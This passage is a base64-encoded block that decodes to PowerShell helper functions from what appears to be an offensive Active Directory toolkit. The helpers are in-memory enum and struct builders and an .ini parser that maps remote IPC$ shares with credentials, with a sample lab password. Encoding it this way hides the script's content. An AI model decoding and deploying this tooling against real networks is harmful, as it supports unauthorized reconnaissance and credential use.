hlIFBvc2l4IGNoYXJhY3RlciBzdWJzeXN0ZW0uCiAgICBOQVRJVkVfV0lORE9XUyA9ICAgICAgICAgICA4ICMgSW1hZ2UgaXMgYSBuYXRpdmUgV2luOXggZHJpdmVyLgogICAgV0lORE9XU19DRV9HVUkgPSAgICAgICAgICAgOSAjIEltYWdlIHJ1bnMgaW4gdGhlIFdpbmRvd3MgQ0Ugc3Vic3lzdGVtLgogICAgRUZJX0FQUExJQ0FUSU9OID0gICAgICAgICAgMTAKICAgIEVGSV9CT09UX1NFUlZJQ0VfRFJJVkVSID0gIDExCiAgICBFRklfUlVOVElNRV9EUklWRVIgPSAgICAgICAxMgogICAgRUZJX1JPTSA9ICAgICAgICAgICAgICAgICAgMTMKICAgIFhCT1ggPSAgICAgICAgICAgICAgICAgICAgIDE0CiAgICBXSU5ET1dTX0JPT1RfQVBQTElDQVRJT04gPSAxNgp9CgouTk9URVMKClBvd2VyU2hlbGwgcHVyaXN0cyBtYXkgZGlzYWdyZWUgd2l0aCB0aGUgbmFtaW5nIG9mIHRoaXMgZnVuY3Rpb24gYnV0CmFnYWluLCB0aGlzIHdhcyBkZXZlbG9wZWQgaW4gc3VjaCBhIHdheSBzbyBhcyB0byBlbXVsYXRlIGEgIkMgc3R5bGUiCmRlZmluaXRpb24gYXMgY2xvc2VseSBhcyBwb3NzaWJsZS4gU29ycnksIEknbSBub3QgZ29pbmcgdG8gbmFtZSBpdApOZXctRW51bS4gOlAKIz4KCiAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7KCRfIC1pcyBbUmVmbGVjdGlvbi5FbWl0Lk1vZHVsZUJ1aWxkZXJdKSAtb3IgKCRfIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pfSldCiAgICAgICAgJE1vZHVsZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdWxsTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1R5cGVdCiAgICAgICAgJFR5cGUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0hhc2h0YWJsZV0KICAgICAgICAkRW51bUVsZW1lbnRzLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRCaXRmaWVsZAogICAgKQoKICAgIGlmICgkTW9kdWxlIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pCiAgICB7CiAgICAgICAgcmV0dXJuICgkTW9kdWxlLkdldFR5cGUoJEZ1bGxOYW1lKSkKICAgIH0KCiAgICAkRW51bVR5cGUgPSAkVHlwZSAtYXMgW1R5cGVdCgogICAgJEVudW1CdWlsZGVyID0gJE1vZHVsZS5EZWZpbmVFbnVtKCRGdWxsTmFtZSwgJ1B1YmxpYycsICRFbnVtVHlwZSkKCiAgICBpZiAoJEJpdGZpZWxkKQogICAgewogICAgICAgICRGbGFnc0NvbnN0cnVjdG9yID0gW0ZsYWdzQXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcihAKCkpCiAgICAgICAgJEZsYWdzQ3VzdG9tQXR0cmlidXRlID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkRmxhZ3NDb25zdHJ1Y3RvciwgQCgpKQogICAgICAgICRFbnVtQnVpbGRlci5TZXRDdXN0b21BdHRyaWJ1dGUoJEZsYWdzQ3VzdG9tQXR0cmlidXRlKQogICAgfQoKICAgIGZvcmVhY2ggKCRLZXkgaW4gJEVudW1FbGVtZW50cy5LZXlzKQogICAgewogICAgICAgICMgQXBwbHkgdGhlIHNwZWNpZmllZCBlbnVtIHR5cGUgdG8gZWFjaCBlbGVtZW50CiAgICAgICAgJG51bGwgPSAkRW51bUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgkS2V5LCAkRW51bUVsZW1lbnRzWyRLZXldIC1hcyAkRW51bVR5cGUpCiAgICB9CgogICAgJEVudW1CdWlsZGVyLkNyZWF0ZVR5cGUoKQp9CgoKIyBBIGhlbHBlciBmdW5jdGlvbiB1c2VkIHRvIHJlZHVjZSB0eXBpbmcgd2hpbGUgZGVmaW5pbmcgc3RydWN0CiMgZmllbGRzLgpmdW5jdGlvbiBmaWVsZCB7CiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1VJbnQxNl0KICAgICAgICAkUG9zaXRpb24sCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtUeXBlXQogICAgICAgICRUeXBlLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMildCiAgICAgICAgW1VJbnQxNl0KICAgICAgICAkT2Zmc2V0LAoKICAgICAgICBbT2JqZWN0W11dCiAgICAgICAgJE1hcnNoYWxBcwogICAgKQoKICAgIEB7CiAgICAgICAgUG9zaXRpb24gPSAkUG9zaXRpb24KICAgICAgICBUeXBlID0gJFR5cGUgLWFzIFtUeXBlXQogICAgICAgIE9mZnNldCA9ICRPZmZzZXQKICAgICAgICBNYXJzaGFsQXMgPSAkTWFyc2hhbEFzCiAgICB9Cn0KCgpmdW5jdGlvbiBzdHJ1Y3QKewo8IwouU1lOT1BTSVMKCkNyZWF0ZXMgYW4gaW4tbWVtb3J5IHN0cnVjdCBmb3IgdXNlIGluIHlvdXIgUG93ZXJTaGVsbCBzZXNzaW9uLgoKQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IGZpZWxkCgouREVTQ1JJUFRJT04KClRoZSAnc3RydWN0JyBmdW5jdGlvbiBmYWNpbGl0YXRlcyB0aGUgY3JlYXRpb24gb2Ygc3RydWN0cyBlbnRpcmVseSBpbgptZW1vcnkgdXNpbmcgYXMgY2xvc2UgdG8gYSAiQyBzdHlsZSIgYXMgUG93ZXJTaGVsbCB3aWxsIGFsbG93LiBTdHJ1Y3QKZmllbGRzIGFyZSBzcGVjaWZpZWQgdXNpbmcgYSBoYXNodGFibGUgd2hlcmUgZWFjaCBmaWVsZCBvZiB0aGUgc3RydWN0CmlzIGNvbXByb3NlZCBvZiB0aGUgb3JkZXIgaW4gd2hpY2ggaXQgc2hvdWxkIGJlIGRlZmluZWQsIGl0cyAuTkVUCnR5cGUsIGFuZCBvcHRpb25hbGx5LCBpdHMgb2Zmc2V0IGFuZCBzcGVjaWFsIG1hcnNoYWxpbmcgYXR0cmlidXRlcy4KCk9uZSBvZiB0aGUgZmVhdHVyZXMgb2YgJ3N0cnVjdCcgaXMgdGhhdCBhZnRlciB5b3VyIHN0cnVjdCBpcyBkZWZpbmVkLAppdCB3aWxsIGNvbWUgd2l0aCBhIGJ1aWx0LWluIEdldFNpemUgbWV0aG9kIGFzIHdlbGwgYXMgYW4gZXhwbGljaXQKY29udmVydGVyIHNvIHRoYXQgeW91IGNhbiBlYXNpbHkgY2FzdCBhbiBJbnRQdHIgdG8gdGhlIHN0cnVjdCB3aXRob3V0CnJlbHlpbmcgdXBvbiBjYWxsaW5nIFNpemVPZiBhbmQvb3IgUHRyVG9TdHJ1Y3R1cmUgaW4gdGhlIE1hcnNoYWwKY2xhc3MuCgouUEFSQU1FVEVSIE1vZHVsZQoKVGhlIGluLW1lbW9yeSBtb2R1bGUgdGhhdCB3aWxsIGhvc3QgdGhlIHN0cnVjdC4gVXNlCk5ldy1Jbk1lbW9yeU1vZHVsZSB0byBkZWZpbmUgYW4gaW4tbWVtb3J5IG1vZHVsZS4KCi5QQVJBTUVURVIgRnVsbE5hbWUKClRoZSBmdWxseS1xdWFsaWZpZWQgbmFtZSBvZiB0aGUgc3RydWN0LgoKLlBBUkFNRVRFUiBTdHJ1Y3RGaWVsZHMKCkEgaGFzaHRhYmxlIG9mIGZpZWxkcy4gVXNlIHRoZSAnZmllbGQnIGhlbHBlciBmdW5jdGlvbiB0byBlYXNlCmRlZmluaW5nIGVhY2ggZmllbGQuCgouUEFSQU1FVEVSIFBhY2tpbmdTaXplCgpTcGVjaWZpZXMgdGhlIG1lbW9yeSBhbGlnbm1lbnQgb2YgZmllbGRzLgoKLlBBUkFNRVRFUiBFeHBsaWNpdExheW91dAoKSW5kaWNhdGVzIHRoYXQgYW4gZXhwbGljaXQgb2Zmc2V0IGZvciBlYWNoIGZpZWxkIHdpbGwgYmUgc3BlY2lmaWVkLgoKLkVYQU1QTEUKCiRNb2QgPSBOZXctSW5NZW1vcnlNb2R1bGUgLU1vZHVsZU5hbWUgV2luMzIKCiRJbWFnZURvc1NpZ25hdHVyZSA9IHBzZW51bSAkTW9kIFBFLklNQUdFX0RPU19TSUdOQVRVUkUgVUludDE2IEB7CiAgICBET1NfU0lHTkFUVVJFID0gICAgMHg1QTRECiAgICBPUzJfU0lHTkFUVVJFID0gICAgMHg0NTRFCiAgICBPUzJfU0lHTkFUVVJFX0xFID0gMHg0NTRDCiAgICBWWERfU0lHTkFUVVJFID0gICAgMHg0NTRDCn0KCiRJbWFnZURvc0hlYWRlciA9IHN0cnVjdCAkTW9kIFBFLklNQUdFX0RPU19IRUFERVIgQHsKICAgIGVfbWFnaWMgPSAgICBmaWVsZCAwICRJbWFnZURvc1NpZ25hdHVyZQogICAgZV9jYmxwID0gICAgIGZpZWxkIDEgVUludDE2CiAgICBlX2NwID0gICAgICAgZmllbGQgMiBVSW50MTYKICAgIGVfY3JsYyA9ICAgICBmaWVsZCAzIFVJbnQxNgogICAgZV9jcGFyaGRyID0gIGZpZWxkIDQgVUludDE2CiAgICBlX21pbmFsbG9jID0gZmllbGQgNSBVSW50MTYKICAgIGVfbWF4YWxsb2MgPSBmaWVsZCA2IFVJbnQxNgogICAgZV9zcyA9ICAgICAgIGZpZWxkIDcgVUludDE2CiAgICBlX3NwID0gICAgICAgZmllbGQgOCBVSW50MTYKICAgIGVfY3N1bSA9ICAgICBmaWVsZCA5IFVJbnQxNgogICAgZV9pcCA9ICAgICAgIGZpZWxkIDEwIFVJbnQxNgogICAgZV9jcyA9ICAgICAgIGZpZWxkIDExIFVJbnQxNgogICAgZV9sZmFybGMgPSAgIGZpZWxkIDEyIFVJbnQxNgogICAgZV9vdm5vID0gICAgIGZpZWxkIDEzIFVJbnQxNgogICAgZV9yZXMgPSAgICAgIGZpZWxkIDE0IFVJbnQxNltdIC1NYXJzaGFsQXMgQCgnQnlWYWxBcnJheScsIDQpCiAgICBlX29lbWlkID0gICAgZmllbGQgMTUgVUludDE2CiAgICBlX29lbWluZm8gPSAgZmllbGQgMTYgVUludDE2CiAgICBlX3JlczIgPSAgICAgZmllbGQgMTcgVUludDE2W10gLU1hcnNoYWxBcyBAKCdCeVZhbEFycmF5JywgMTApCiAgICBlX2xmYW5ldyA9ICAgZmllbGQgMTggSW50MzIKfQoKIyBFeGFtcGxlIG9mIHVzaW5nIGFuIGV4cGxpY2l0IGxheW91dCBpbiBvcmRlciB0byBjcmVhdGUgYSB1bmlvbi4KJFRlc3RVbmlvbiA9IHN0cnVjdCAkTW9kIFRlc3RVbmlvbiBAewogICAgZmllbGQxID0gZmllbGQgMCBVSW50MzIgMAogICAgZmllbGQyID0gZmllbGQgMSBJbnRQdHIgMAp9IC1FeHBsaWNpdExheW91dAoKLk5PVEVTCgpQb3dlclNoZWxsIHB1cmlzdHMgbWF5IGRpc2FncmVlIHdpdGggdGhlIG5hbWluZyBvZiB0aGlzIGZ1bmN0aW9uIGJ1dAphZ2FpbiwgdGhpcyB3YXMgZGV2ZWxvcGVkIGluIHN1Y2ggYSB3YXkgc28gYXMgdG8gZW11bGF0ZSBhICJDIHN0eWxlIgpkZWZpbml0aW9uIGFzIGNsb3NlbHkgYXMgcG9zc2libGUuIFNvcnJ5LCBJJ20gbm90IGdvaW5nIHRvIG5hbWUgaXQKTmV3LVN0cnVjdC4gOlAKIz4KCiAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7KCRfIC1pcyBbUmVmbGVjdGlvbi5FbWl0Lk1vZHVsZUJ1aWxkZXJdKSAtb3IgKCRfIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pfSldCiAgICAgICAgJE1vZHVsZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdWxsTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRTdHJ1Y3RGaWVsZHMsCgogICAgICAgIFtSZWZsZWN0aW9uLkVtaXQuUGFja2luZ1NpemVdCiAgICAgICAgJFBhY2tpbmdTaXplID0gW1JlZmxlY3Rpb24uRW1pdC5QYWNraW5nU2l6ZV06OlVuc3BlY2lmaWVkLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRFeHBsaWNpdExheW91dAogICAgKQoKICAgIGlmICgkTW9kdWxlIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pCiAgICB7CiAgICAgICAgcmV0dXJuICgkTW9kdWxlLkdldFR5cGUoJEZ1bGxOYW1lKSkKICAgIH0KCiAgICBbUmVmbGVjdGlvbi5UeXBlQXR0cmlidXRlc10gJFN0cnVjdEF0dHJpYnV0ZXMgPSAnQW5zaUNsYXNzLAogICAgICAgIENsYXNzLAogICAgICAgIFB1YmxpYywKICAgICAgICBTZWFsZWQsCiAgICAgICAgQmVmb3JlRmllbGRJbml0JwoKICAgIGlmICgkRXhwbGljaXRMYXlvdXQpCiAgICB7CiAgICAgICAgJFN0cnVjdEF0dHJpYnV0ZXMgPSAkU3RydWN0QXR0cmlidXRlcyAtYm9yIFtSZWZsZWN0aW9uLlR5cGVBdHRyaWJ1dGVzXTo6RXhwbGljaXRMYXlvdXQKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkU3RydWN0QXR0cmlidXRlcyA9ICRTdHJ1Y3RBdHRyaWJ1dGVzIC1ib3IgW1JlZmxlY3Rpb24uVHlwZUF0dHJpYnV0ZXNdOjpTZXF1ZW50aWFsTGF5b3V0CiAgICB9CgogICAgJFN0cnVjdEJ1aWxkZXIgPSAkTW9kdWxlLkRlZmluZVR5cGUoJEZ1bGxOYW1lLCAkU3RydWN0QXR0cmlidXRlcywgW1ZhbHVlVHlwZV0sICRQYWNraW5nU2l6ZSkKICAgICRDb25zdHJ1Y3RvckluZm8gPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbEFzQXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcnMoKVswXQogICAgJFNpemVDb25zdCA9IEAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxBc0F0dHJpYnV0ZV0uR2V0RmllbGQoJ1NpemVDb25zdCcpKQoKICAgICRGaWVsZHMgPSBOZXctT2JqZWN0IEhhc2h0YWJsZVtdKCRTdHJ1Y3RGaWVsZHMuQ291bnQpCgogICAgIyBTb3J0IGVhY2ggZmllbGQgYWNjb3JkaW5nIHRvIHRoZSBvcmRlcnMgc3BlY2lmaWVkCiAgICAjIFVuZm9ydHVuYXRlbHksIFBTdjIgZG9lc24ndCBoYXZlIHRoZSBsdXh1cnkgb2YgdGhlCiAgICAjIGhhc2h0YWJsZSBbT3JkZXJlZF0gYWNjZWxlcmF0b3IuCiAgICBmb3JlYWNoICgkRmllbGQgaW4gJFN0cnVjdEZpZWxkcy5LZXlzKQogICAgewogICAgICAgICRJbmRleCA9ICRTdHJ1Y3RGaWVsZHNbJEZpZWxkXVsnUG9zaXRpb24nXQogICAgICAgICRGaWVsZHNbJEluZGV4XSA9IEB7RmllbGROYW1lID0gJEZpZWxkOyBQcm9wZXJ0aWVzID0gJFN0cnVjdEZpZWxkc1skRmllbGRdfQogICAgfQoKICAgIGZvcmVhY2ggKCRGaWVsZCBpbiAkRmllbGRzKQogICAgewogICAgICAgICRGaWVsZE5hbWUgPSAkRmllbGRbJ0ZpZWxkTmFtZSddCiAgICAgICAgJEZpZWxkUHJvcCA9ICRGaWVsZFsnUHJvcGVydGllcyddCgogICAgICAgICRPZmZzZXQgPSAkRmllbGRQcm9wWydPZmZzZXQnXQogICAgICAgICRUeXBlID0gJEZpZWxkUHJvcFsnVHlwZSddCiAgICAgICAgJE1hcnNoYWxBcyA9ICRGaWVsZFByb3BbJ01hcnNoYWxBcyddCgogICAgICAgICROZXdGaWVsZCA9ICRTdHJ1Y3RCdWlsZGVyLkRlZmluZUZpZWxkKCRGaWVsZE5hbWUsICRUeXBlLCAnUHVibGljJykKCiAgICAgICAgaWYgKCRNYXJzaGFsQXMpCiAgICAgICAgewogICAgICAgICAgICAkVW5tYW5hZ2VkVHlwZSA9ICRNYXJzaGFsQXNbMF0gLWFzIChbUnVudGltZS5JbnRlcm9wU2VydmljZXMuVW5tYW5hZ2VkVHlwZV0pCiAgICAgICAgICAgIGlmICgkTWFyc2hhbEFzWzFdKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU2l6ZSA9ICRNYXJzaGFsQXNbMV0KICAgICAgICAgICAgICAgICRBdHRyaWJCdWlsZGVyID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkQ29uc3RydWN0b3JJbmZvLAogICAgICAgICAgICAgICAgICAgICRVbm1hbmFnZWRUeXBlLCAkU2l6ZUNvbnN0LCBAKCRTaXplKSkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRBdHRyaWJCdWlsZGVyID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkQ29uc3RydWN0b3JJbmZvLCBbT2JqZWN0W11dIEAoJFVubWFuYWdlZFR5cGUpKQogICAgICAgICAgICB9CgogICAgICAgICAgICAkTmV3RmllbGQuU2V0Q3VzdG9tQXR0cmlidXRlKCRBdHRyaWJCdWlsZGVyKQogICAgICAgIH0KCiAgICAgICAgaWYgKCRFeHBsaWNpdExheW91dCkgeyAkTmV3RmllbGQuU2V0T2Zmc2V0KCRPZmZzZXQpIH0KICAgIH0KCiAgICAjIE1ha2UgdGhlIHN0cnVjdCBhd2FyZSBvZiBpdHMgb3duIHNpemUuCiAgICAjIE5vIG1vcmUgaGF2aW5nIHRvIGNhbGwgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YhCiAgICAkU2l6ZU1ldGhvZCA9ICRTdHJ1Y3RCdWlsZGVyLkRlZmluZU1ldGhvZCgnR2V0U2l6ZScsCiAgICAgICAgJ1B1YmxpYywgU3RhdGljJywKICAgICAgICBbSW50XSwKICAgICAgICBbVHlwZVtdXSBAKCkpCiAgICAkSUxHZW5lcmF0b3IgPSAkU2l6ZU1ldGhvZC5HZXRJTEdlbmVyYXRvcigpCiAgICAjIFRoYW5rcyBmb3IgdGhlIGhlbHAsIEphc29uIFNoaXJrIQogICAgJElMR2VuZXJhdG9yLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6TGR0b2tlbiwgJFN0cnVjdEJ1aWxkZXIpCiAgICAkSUxHZW5lcmF0b3IuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpDYWxsLAogICAgICAgIFtUeXBlXS5HZXRNZXRob2QoJ0dldFR5cGVGcm9tSGFuZGxlJykpCiAgICAkSUxHZW5lcmF0b3IuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpDYWxsLAogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXS5HZXRNZXRob2QoJ1NpemVPZicsIFtUeXBlW11dIEAoW1R5cGVdKSkpCiAgICAkSUxHZW5lcmF0b3IuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpSZXQpCgogICAgIyBBbGxvdyBmb3IgZXhwbGljaXQgY2FzdGluZyBmcm9tIGFuIEludFB0cgogICAgIyBObyBtb3JlIGhhdmluZyB0byBjYWxsIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUhCiAgICAkSW1wbGljaXRDb252ZXJ0ZXIgPSAkU3RydWN0QnVpbGRlci5EZWZpbmVNZXRob2QoJ29wX0ltcGxpY2l0JywKICAgICAgICAnUHJpdmF0ZVNjb3BlLCBQdWJsaWMsIFN0YXRpYywgSGlkZUJ5U2lnLCBTcGVjaWFsTmFtZScsCiAgICAgICAgJFN0cnVjdEJ1aWxkZXIsCiAgICAgICAgW1R5cGVbXV0gQChbSW50UHRyXSkpCiAgICAkSUxHZW5lcmF0b3IyID0gJEltcGxpY2l0Q29udmVydGVyLkdldElMR2VuZXJhdG9yKCkKICAgICRJTEdlbmVyYXRvcjIuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpOb3ApCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6TGRhcmdfMCkKICAgICRJTEdlbmVyYXRvcjIuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpMZHRva2VuLCAkU3RydWN0QnVpbGRlcikKICAgICRJTEdlbmVyYXRvcjIuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpDYWxsLAogICAgICAgIFtUeXBlXS5HZXRNZXRob2QoJ0dldFR5cGVGcm9tSGFuZGxlJykpCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Q2FsbCwKICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF0uR2V0TWV0aG9kKCdQdHJUb1N0cnVjdHVyZScsIFtUeXBlW11dIEAoW0ludFB0cl0sIFtUeXBlXSkpKQogICAgJElMR2VuZXJhdG9yMi5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OlVuYm94X0FueSwgJFN0cnVjdEJ1aWxkZXIpCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6UmV0KQoKICAgICRTdHJ1Y3RCdWlsZGVyLkNyZWF0ZVR5cGUoKQp9CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIwojIE1pc2MuIGhlbHBlcnMKIwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZnVuY3Rpb24gR2V0LUluaUNvbnRlbnQgewo8IwouU1lOT1BTSVMKClRoaXMgaGVscGVyIHBhcnNlcyBhbiAuaW5pIGZpbGUgaW50byBhIGhhc2h0YWJsZS4KCkF1dGhvcjogJ1RoZSBTY3JpcHRpbmcgR3V5cycKTW9kaWZpY2F0aW9uczogQGhhcm1qMHkgKC1DcmVkZW50aWFsIHN1cHBvcnQpCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZQpSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEFkZC1SZW1vdGVDb25uZWN0aW9uLCBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbgoKLkRFU0NSSVBUSU9OCgpQYXJzZXMgYW4gLmluaSBmaWxlIGludG8gYSBoYXNodGFibGUuIElmIC1DcmVkZW50aWFsIGlzIHN1cHBsaWVkLAp0aGVuIEFkZC1SZW1vdGVDb25uZWN0aW9uIGlzIHVzZWQgdG8gbWFwIFxcQ09NUFVURVJOQU1FXElQQyQsIHRoZSBmaWxlCmlzIHBhcnNlZCwgYW5kIHRoZW4gdGhlIGNvbm5lY3Rpb24gaXMgZGVzdHJveWVkIHdpdGggUmVtb3ZlLVJlbW90ZUNvbm5lY3Rpb24uCgouUEFSQU1FVEVSIFBhdGgKClNwZWNpZmllcyB0aGUgcGF0aCB0byB0aGUgLmluaSBmaWxlIHRvIHBhcnNlLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSByZW1vdGUgc3lzdGVtLgoKLkVYQU1QTEUKCkdldC1JbmlDb250ZW50IEM6XFdpbmRvd3NcZXhhbXBsZS5pbmkKCi5FWEFNUExFCgoiQzpcV2luZG93c1xleGFtcGxlLmluaSIgfCBHZXQtSW5pQ29udGVudAoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1JbmlDb250ZW50IC1QYXRoIFxcUFJJTUFSWS50ZXN0bGFiLmxvY2FsXEMkXFRlbXBcR3B0VG1wbC5pbmYgLUNyZWRlbnRpYWwgJENyZWQKCi5JTlBVVFMKClN0cmluZwoKQWNjZXB0cyBvbmUgb3IgbW9yZSAuaW5pIHBhdGhzIG9uIHRoZSBwaXBlbGluZS4KCi5PVVRQVVRTCgpIYXNodGFibGUKCk91cHV0cyBhIGhhc2h0YWJsZSByZXByZXNlbnRpbmcgdGhlIHBhcnNlZCAuaW5pIGZpbGUuCgouTElOSwoKaHR0cHM6Ly9ibG9ncy50ZWNobmV0Lm1pY3Jvc29mdC5jb20vaGV5c2NyaXB0aW5nZ3V5LzIwMTEvMDgvMjAvdXNlLXBvd2Vyc2hlbGwtdG8td29yay13aXRoLWFueS1pbmktZmlsZS8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoW0hhc2h0YWJsZV0pXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Z1bGxOYW1lJywgJ05hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUGF0aCwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRNYXBwZWRDb21wdXRlcnMgPSBAe30KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkVGFyZ2V0UGF0aCBpbiAkUGF0aCkgewogICAgICAgICAgICBpZiAoKCRUYXJnZXRQYXRoIC1NYXRjaCAnXFxcXC4qXFwuKicpIC1hbmQgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSkgewogICAgICAgICAgICAgICAgJEhvc3RDb21wdXRlciA9IChOZXctT2JqZWN0IFN5c3RlbS5VcmkoJFRhcmdldFBhdGgpKS5Ib3N0CiAgICAgICAgICAgICAgICBpZiAoLW5vdCAkTWFwcGVkQ29tcHV0ZXJzWyRIb3N0Q29tcHV0ZXJdKSB7CiAgICAgICAgICAgICAgIC